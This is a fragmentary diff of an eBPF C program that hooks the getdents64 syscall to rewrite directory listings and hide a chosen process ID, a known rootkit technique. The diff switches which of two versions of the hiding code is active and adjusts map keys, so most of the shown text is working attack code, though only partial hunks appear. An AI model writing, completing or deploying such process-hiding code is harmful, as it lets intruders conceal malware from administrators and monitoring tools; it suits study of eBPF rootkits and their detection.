@@ -1,4 +1,4 @@
-/*#include "vmlinux.h"
+#include "vmlinux.h"
 #include <bpf/bpf_helpers.h>
 #include <bpf/bpf_tracing.h>
 #include <bpf/bpf_core_read.h>
@@ -54,7 +54,7 @@ struct linux_dirent64 {
 	char d_name[0];
 };*/
 
-/*SEC("tp/syscalls/sys_enter_getdents64")
+SEC("tp/syscalls/sys_enter_getdents64")
 int handle_getdents64_enter(struct trace_event_raw_sys_enter *ctx) {
     size_t pid_tgid = bpf_get_current_pid_tgid();
 
@@ -71,7 +71,7 @@ int handle_getdents64_enter(struct trace_event_raw_sys_enter *ctx) {
     unsigned int buff_count = ctx->args[2];
 
     struct linux_dirent64 *dirent = (struct linux_dirent64 *) ctx->args[1];
-    bpf_map_update_elem(&map_buffers, &pid, &dirent, BPF_ANY);
+    bpf_map_update_elem(&map_buffers, &pid_tgid, &dirent, BPF_ANY);
 
     return 0;
 }
@@ -85,7 +85,7 @@ int handle_getdents64_exit(struct trace_event_raw_sys_exit *ctx) {
        is returned, and errno is set to indicate the error.
     */
     //ret是getdents64的返回值
-    /*int total_bytes_read = ctx->ret;
+    int total_bytes_read = ctx->ret;
     if(total_bytes_read <= 0) {
         return 0;
     }
@@ -179,7 +179,7 @@ int handle_getdents64_patch(struct trace_event_raw_sys_exit *ctx) {
     e = bpf_ringbuf_reserve(&rb, sizeof(*e), 0);
     if(e) {
         e->success = (ret == 0);
-        e->pid = pid_tgid >> 32;
+        e->pid = (pid_tgid >> 32);
         bpf_get_current_comm(&e->comm, sizeof(e->comm));
         bpf_ringbuf_submit(e, 0);
     }
@@ -196,7 +196,7 @@ int handle_getdents64_patch(struct trace_event_raw_sys_exit *ctx) {
  */
 
 // SPDX-License-Identifier: BSD-3-Clause
-#include "vmlinux.h"
+/*#include "vmlinux.h"
 #include <bpf/bpf_helpers.h>
 #include <bpf/bpf_tracing.h>
 #include <bpf/bpf_core_read.h>
@@ -264,7 +264,7 @@ const volatile char pid_to_hide[MAX_PID_LEN];
 //     unsigned char  d_type;   /* File type */
 //     char           d_name[]; /* Filename (null-terminated) */ };
 // int getdents64(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count);
-SEC("tp/syscalls/sys_enter_getdents64")
+/*SEC("tp/syscalls/sys_enter_getdents64")
 int handle_getdents_enter(struct trace_event_raw_sys_enter *ctx)
 {
     size_t pid_tgid = bpf_get_current_pid_tgid();
@@ -420,4 +420,4 @@ int handle_getdents_patch(struct trace_event_raw_sys_exit *ctx)
 
     bpf_map_delete_elem(&map_to_patch, &pid_tgid);
     return 0;
-}
+}*/
